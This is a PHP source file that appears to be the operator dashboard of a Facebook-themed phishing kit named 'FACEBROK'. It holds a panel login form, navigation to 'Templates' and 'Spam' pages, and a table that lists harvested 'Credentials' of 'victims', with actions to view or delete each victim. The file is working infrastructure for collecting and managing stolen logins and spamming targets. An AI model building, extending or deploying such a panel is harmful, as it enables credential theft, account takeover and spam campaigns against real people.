<?php
	include 'core.function.no.class.php';
	check_install_in_croak();
	include 'core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();
	if(!$facebrok->check_session()){
		if($_GET['action']=="login"){
			$facebrok->checkuser($_POST['userp'],$_POST['passp']);
		}
		?>
		<style type="text/css"> @import url(https://fonts.googleapis.com/css?family=Roboto:400,300,600,400italic); * {margin: 0; padding: 0; box-sizing: border-box; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; -webkit-font-smoothing: antialiased; -moz-font-smoothing: antialiased; -o-font-smoothing: antialiased; font-smoothing: antialiased; text-rendering: optimizeLegibility; } body {font-family: "Roboto", Helvetica, Arial, sans-serif; font-weight: 100; font-size: 12px; line-height: 30px; color: #777; background: #196386; } .container {max-width: 400px; width: 100%; margin: 0 auto; position: relative; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea, #contact button[type="submit"] {font: 400 12px/16px "Roboto", Helvetica, Arial, sans-serif; } #contact {background: #F9F9F9; padding: 25px; margin: 150px 0; box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24); } #contact h3 {display: block; font-size: 30px; font-weight: 300; margin-bottom: 10px; } #contact h4 {margin: 5px 0 15px; display: block; font-size: 13px; font-weight: 400; } fieldset {border: medium none !important; margin: 0 0 10px; min-width: 100%; padding: 0; width: 100%; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea {width: 100%; border: 1px solid #ccc; background: #FFF; margin: 0 0 5px; padding: 10px; } #contact input[type="text"]:hover, #contact input[type="email"]:hover, #contact input[type="tel"]:hover, #contact input[type="url"]:hover, #contact textarea:hover {-webkit-transition: border-color 0.3s ease-in-out; -moz-transition: border-color 0.3s ease-in-out; transition: border-color 0.3s ease-in-out; border: 1px solid #aaa; } #contact textarea {height: 100px; max-width: 100%; resize: none; } #contact button[type="submit"] {cursor: pointer; width: 100%; border: none; background: #4CAF50; color: #FFF; margin: 0 0 5px; padding: 10px; font-size: 15px; } #contact button[type="submit"]:hover {background: #43A047; -webkit-transition: background 0.3s ease-in-out; -moz-transition: background 0.3s ease-in-out; transition: background-color 0.3s ease-in-out; } #contact button[type="submit"]:active {box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5); } .copyright {text-align: center; } #contact input:focus, #contact textarea:focus {outline: 0; border: 1px solid #aaa; } ::-webkit-input-placeholder {color: #888; } :-moz-placeholder {color: #888; } ::-moz-placeholder {color: #888; } :-ms-input-placeholder {color: #888; } </style> <div class="container">
		<link rel="shortcut icon" href="../asses/facebook.ico" />
		<title>FACEBROK Log in</title> 
		  <form id="contact" action="index.php?action=login" method="post">
		    <h3>FACEBROK</h3>
		    <h4>Log in</h4>
		    <fieldset>
		      <input placeholder="username facebrok" type="text" name="userp" tabindex="5" required>
		    </fieldset>
		    <fieldset>
		      <input placeholder="password facebrok" type="text" name="passp" tabindex="6" required></textarea>
		    </fieldset>
		    <fieldset>
		      <button name="submit" type="submit" id="contact-submit" data-submit="...Sending">Login</button>
		    </fieldset>
		  </form>
		</div>
		<?php
	}else{

		$MSG="";
		if($_GET['action']=="logout"){$facebrok->logout();}
		if($_GET['action']=="delete_victim"){$MSG=$facebrok->delete_victim($_GET['id']);}
		if($_GET['action']=="extra_victim") {$MSG=$facebrok->get_info_victim($_GET['id']);}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><link rel="shortcut icon" href="asses/facebook.ico" />
<head>
	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
	<title>FACEBROK Panel</title>
	<link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
</head>
<body>
<!-- Header -->
<div id="header">
	<div class="shell">
		<!-- Logo + Top Nav -->
		<div id="top">
			<h1><img src="asses/facebrok_icon.png"></h1>

		</div>
		<!-- End Logo + Top Nav -->
		
		<!-- Main Nav -->
		<div id="navigation">
			<ul>
			    <li><a href="index.php" class="active"><span>Dashboard</span></a></li>
			    <li><a href="templates.php"><span>Templates</span></a></li>
			    <li><a href="spammer.php"><span>Spam</span></a></li>
			    <li><a href="config.php"><span>Config</span></a></li>
			    <li><a href="about.php"><span>About</span></a></li>
			    <li><a href="index.php?action=logout"><span>Log out</span></a></li>
			</ul>
		</div>
		<!-- End Main Nav -->
	</div>
</div>
<!-- End Header -->

<!-- Container -->
<div id="container">
	<div class="shell">
		
		<!-- Small Nav -->
		<div class="small-nav">
			<a href="#">Dashboard</a>
			<span>&gt;</span>
			LOGS
		</div>
		<!-- End Small Nav -->
		
		<?php echo $MSG;?>
		

		<br />
		<!-- Main -->
		<div id="main">
			<div class="cl">&nbsp;</div>
			
			<!-- Content -->
			<div id="content">
				
				<!-- Box -->
				<div class="box">
					<!-- Box Head -->
					<div class="box-head">
						<h2 class="left">LOSG</h2>
						
					</div>
					<!-- End Box Head -->	

					
					<!-- Table -->
					<div class="table">
						<table width="100%" border="0" cellspacing="0" cellpadding="0">
							<tr>
								<th width="13"><input type="checkbox" id="zmark" class="checkbox" onClick="mark(this)"/></th>
								<th>Credentials</th>
								<th>Date</th>
								<th width="110" class="ac">Content Control</th>
							</tr>
							<?php $facebrok->get_list_victms();?>
						</table>
					</div>

				</div>
			</div>
			<div class="cl">&nbsp;</div>			
		</div>
		<!-- Main -->
	</div>
</div>
<!-- End Container -->

<script type="text/javascript">
					function mark(source){
							checkboxes = document.getElementsByName('zmark');
							  for(var i=0, n=checkboxes.length;i<n;i++) {
							    checkboxes[i].checked = source.checked;
							  }
						}
					</script>

</body>
</html>
<?php } ?>